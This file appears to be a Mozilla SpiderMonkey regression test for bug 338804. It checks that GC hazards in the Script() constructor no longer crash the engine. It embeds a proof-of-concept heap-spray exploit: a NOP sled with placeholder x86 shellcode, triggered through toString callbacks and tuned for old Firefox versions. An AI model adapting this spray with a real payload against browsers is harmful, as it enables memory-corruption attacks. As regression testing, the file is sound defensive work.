/* -*- Mode: C++; tab-width: 2; indent-tabs-mode: nil; c-basic-offset: 2 -*- */
/* ***** BEGIN LICENSE BLOCK *****
 * Version: MPL 1.1/GPL 2.0/LGPL 2.1
 *
 * The contents of this file are subject to the Mozilla Public License Version
 * 1.1 (the "License"); you may not use this file except in compliance with
 * the License. You may obtain a copy of the License at
 * http://www.mozilla.org/MPL/
 *
 * Software distributed under the License is distributed on an "AS IS" basis,
 * WITHOUT WARRANTY OF ANY KIND, either express or implied. See the License
 * for the specific language governing rights and limitations under the
 * License.
 *
 * The Original Code is JavaScript Engine testing utilities.
 *
 * The Initial Developer of the Original Code is
 * Mozilla Foundation.
 * Portions created by the Initial Developer are Copyright (C) 2006
 * the Initial Developer. All Rights Reserved.
 *
 * Contributor(s): shutdown
 *
 * Alternatively, the contents of this file may be used under the terms of
 * either the GNU General Public License Version 2 or later (the "GPL"), or
 * the GNU Lesser General Public License Version 2.1 or later (the "LGPL"),
 * in which case the provisions of the GPL or the LGPL are applicable instead
 * of those above. If you wish to allow use of your version of this file only
 * under the terms of either the GPL or the LGPL, and not to allow others to
 * use your version of this file under the terms of the MPL, indicate your
 * decision by deleting the provisions above and replace them with the notice
 * and other provisions required by the GPL or the LGPL. If you do not delete
 * the provisions above, a recipient may use your version of this file under
 * the terms of any one of the MPL, the GPL or the LGPL.
 *
 * ***** END LICENSE BLOCK ***** */

var gTestfile = 'regress-338804-02.js';
//-----------------------------------------------------------------------------
var BUGNUMBER = 338804;
var summary = 'GC hazards in constructor functions';
var actual = 'No Crash';
var expect = 'No Crash';

printBugNumber(BUGNUMBER);
printStatus (summary);
printStatus ('Uses Intel Assembly');

// <script>
// SpiderMonkey Script() GC hazard exploit
//
// scale: magic number ;-)
//  BonEcho/2.0a2: 3000
//  Firefox/1.5.0.4: 2000
//
var rooter, scale = 2000;

exploit();
/*
  if(typeof(setTimeout) != "undefined") {
  setTimeout(exploit, 2000);
  } else {
  exploit();
  }
*/

function exploit() {
  if (typeof Script == 'undefined')
  {
    print('Test skipped. Script not defined.');
  }
  else
  {
    Script({ toString: fillHeap });
    Script({ toString: fillHeap });
  }
}

function createPayload() {
  var result = "\u9090", i;
  for(i = 0; i < 9; i++) {
    result += result;
  }
  /* mov eax, 0xdeadfeed; mov ebx, eax; mov ecx, eax; mov edx, eax; int3 */
  result += "\uEDB8\uADFE\u89DE\u89C3\u89C1\uCCC2";
  return result;
}

function fillHeap() {
  rooter = [];
  var payload = createPayload(), block = "", s2 = scale * 2, i;
  for(i = 0; i < scale; i++) {
    rooter[i] = block = block + payload;
  }
  for(; i < s2; i++) {
    rooter[i] = payload + i;
  }
  return "";
}

// </script>
 
reportCompare(expect, actual, summary);
